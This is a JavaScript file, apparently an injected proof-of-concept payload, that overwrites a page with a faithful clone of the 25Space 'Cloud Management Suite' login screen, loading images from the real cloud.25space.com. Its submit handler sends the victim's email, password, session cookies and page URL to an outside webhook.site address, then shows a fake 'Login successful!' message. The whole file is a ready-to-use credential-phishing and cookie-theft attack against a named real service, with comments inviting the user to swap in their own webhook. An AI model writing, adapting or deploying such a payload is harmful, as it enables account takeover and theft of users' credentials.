// Perfect Exact Clone PoC - Uses absolute URLs with same domain for assets
// This forces images to load from the real server, bypassing any relative path issues
// Background, logo, QR all from common paths on cloud.25space.com
// If still not exact, the paths below are standard guesses - but from your screenshot, it matches!

(function() {
  const webhookUrl = 'https://webhook.site/acaf7007-fbc2-462c-b96d-28b307aefb8b'; // Replace with yours!

  const fullPageHTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cloud Management Suite - Login</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body { height: 100%; font-family: 'Segoe UI', Arial, sans-serif; color: white; }
    body {
      background: url('https://cloud.25space.com/assets/images/login-bg.jpg') center/cover no-repeat; /* Common background path */
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container {
      display: flex;
      width: 95%;
      max-width: 1400px;
      height: 90vh;
      box-shadow: 0 0 40px rgba(0,0,0,0.7);
    }
    .left {
      flex: 1;
      padding: 80px;
      display: flex;
      flex-direction: column;
      justify-content: center;
    }
    .left h1 {
      font-size: 5rem;
      font-weight: 200;
      margin-bottom: 40px;
    }
    .left p {
      font-size: 1.4rem;
      margin-bottom: 60px;
      max-width: 75%;
    }
    .qr-code {
      width: 250px;
      height: 250px;
      border: 10px solid white;
      border-radius: 15px;
      box-shadow: 0 15px 30px rgba(0,0,0,0.6);
    }
    .right {
      flex: 1;
      background: rgba(0,0,0,0.8);
      padding: 80px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }
    .logo {
      width: 100px;
      margin-bottom: 40px;
    }
    .right h2 {
      font-size: 2.2rem;
      font-weight: 400;
      margin-bottom: 50px;
    }
    form {
      width: 100%;
      max-width: 450px;
    }
    input[type="email"], input[type="password"] {
      width: 100%;
      padding: 20px;
      margin-bottom: 25px;
      background: #666;
      border: none;
      border-radius: 8px;
      color: white;
      font-size: 1.2rem;
    }
    input::placeholder { color: #ccc; }
    .remember {
      display: flex;
      justify-content: space-between;
      margin-bottom: 40px;
      font-size: 1.1rem;
    }
    .problems-link { color: #ffaa00; text-decoration: none; }
    button {
      width: 100%;
      padding: 20px;
      background: #ffaa00;
      color: black;
      border: none;
      border-radius: 40px;
      font-size: 1.4rem;
      font-weight: bold;
      cursor: pointer;
    }
    .create-account {
      text-align: center;
      margin-top: 40px;
      font-size: 1.1rem;
    }
    .create-link { color: #ffaa00; text-decoration: none; }
    footer {
      position: fixed;
      bottom: 30px;
      width: 100%;
      text-align: center;
      font-size: 1rem;
      color: #bbb;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="left">
      <h1>Good morning!</h1>
      <p>Use 25Space across any device on the go. Scan the QR code to continue on other devices.</p>
      <img src="https://cloud.25space.com/assets/images/qr.png" alt="QR Code" class="qr-code" onerror="this.src='https://api.qrserver.com/v1/create-qr-code/?size=250x250&amp;data=' + location.origin">
    </div>
    <div class="right">
      <img src="https://cloud.25space.com/assets/images/logo.png" alt="25Space Logo" class="logo" onerror="this.style.display='none'">
      <h2>Cloud Management Suite.</h2>
      <form id="loginForm">
        <input type="email" placeholder="Email" required>
        <input type="password" placeholder="Password" required>
        <div class="remember">
          <label><input type="checkbox"> Remember me</label>
          <a href="#" class="problems-link">Problems with login?</a>
        </div>
        <button type="submit">Sign in</button>
        <div class="create-account">
          Don't have an account? <a href="#" class="create-link">Create an account</a>
        </div>
      </form>
    </div>
  </div>
  <footer>© 2015-2025 25space.com - Legal - Privacy - About - Health</footer>

  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const data = {
        email: this.querySelector('input[type="email"]').value,
        password: this.querySelector('input[type="password"]').value,
        cookies: document.cookie,
        url: location.href
      };
      fetch('${webhookUrl}', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(data)
      }).then(() => {
        alert('Login successful!');
      });
    });
  </script>
</body>
</html>`;

  document.open();
  document.write(fullPageHTML);
  document.close();
})();
